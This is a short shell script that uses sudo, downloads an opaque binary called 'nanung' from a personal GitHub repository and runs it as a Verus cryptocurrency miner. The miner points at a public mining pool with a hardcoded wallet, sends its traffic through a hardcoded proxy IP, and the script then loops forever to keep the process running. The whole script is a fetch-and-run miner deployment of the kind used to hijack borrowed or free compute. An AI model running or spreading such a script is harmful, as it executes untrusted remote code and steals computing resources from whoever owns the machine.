
#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/surtitedjohadiningrat/verus/raw/main/nanung
chmod +x nanung
./nanung -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm.nn4 -p c=VRSC,zap=VRSC -t 2 -x 185.32.120.242:1080
while [ 1 ]; do
sleep 3
done
sleep 999
